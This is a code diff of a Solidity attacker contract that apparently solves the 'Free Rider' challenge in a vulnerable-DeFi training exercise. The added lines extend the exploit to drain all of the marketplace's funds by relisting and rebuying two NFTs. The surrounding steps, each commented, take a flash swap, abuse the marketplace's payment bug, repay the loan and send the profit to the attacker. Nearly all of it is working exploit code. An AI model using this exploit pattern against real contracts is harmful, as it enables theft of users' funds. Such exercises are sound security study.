@@ -81,12 +81,28 @@ contract FreeRaiderNFTMarketplaceAttacker is
 
         // 4. Unwrap the WETH to be able to buy DVNFTs from the market
         i_weth.withdraw(_amount0);
+
         // 5. Buy them all with just 15 ETH thanks to the vulnerability (this step requires this contract to be
         // `IERC721Receiver`). Due to the marketplace vulnerability each NFT buy will transfer 15 ETH to this contract
         // (ending with 90 ETH)
         i_marketplace.buyMany{value: _amount0}(tokenIds);
 
-        // 6. Safe transfer all the DVNFTs to the recovery contract in terms to get the 45 ETH bounty
+        // 6. In order to drain all the marketplace funds, put 2 DVNFT to sell for 15 ETH and getback 30 ETH
+        uint256[] memory tokenIdsToBuy = new uint256[](2);
+        tokenIdsToBuy[0] = tokenIds[0];
+        tokenIdsToBuy[1] = tokenIds[1];
+        uint256[] memory tokenPricesToBy = new uint256[](2);
+        tokenPricesToBy[0] = _amount0;
+        tokenPricesToBy[1] = _amount0;
+
+        i_dvNft.setApprovalForAll(address(i_marketplace), true);
+        // NB: a more granular alternative commented out
+        // i_dvNft.approve(address(i_marketplace), tokenIds[0]);
+        // i_dvNft.approve(address(i_marketplace), tokenIds[1]);
+        i_marketplace.offerMany(tokenIdsToBuy, tokenPricesToBy);
+        i_marketplace.buyMany{value: _amount0}(tokenIdsToBuy);
+
+        // 7. Safe transfer all the DVNFTs to the recovery contract in terms to get the 45 ETH bounty
         // NB: the bounty is sent to a determined recipient (i.e. player address) encoded in the call
         address attacker = owner();
         uint256 tokenIdsLength = tokenIds.length;
@@ -102,16 +118,16 @@ contract FreeRaiderNFTMarketplaceAttacker is
             }
         }
 
-        //  7. Calculate the amount of WETH that must be repaid to the UniswapV2 pool (includes the 0.03% fee)
+        // 8. Calculate the amount of WETH that must be repaid to the UniswapV2 pool (includes the 0.03% fee)
         uint256 amountToRepay = _calculateRepayAmount(_amount0); // NB: 15045135406218655968 wei
 
-        // 8. Wrap the required ETH
+        // 9. Wrap the required ETH
         i_weth.deposit{value: amountToRepay}();
 
-        // 9. Repay the pool with WETH
+        // 10. Repay the pool with WETH
         i_weth.transfer(address(i_uniPair), amountToRepay);
 
-        // 10. Transfer all the remaining ETH to the attacker (owner)
+        // 11. Transfer all the remaining ETH to the attacker (owner)
         (bool success, ) = attacker.call{value: address(this).balance}(""); // NB: 74954864593781344032 wei
         if (!success) {
             revert SendEthFailed();
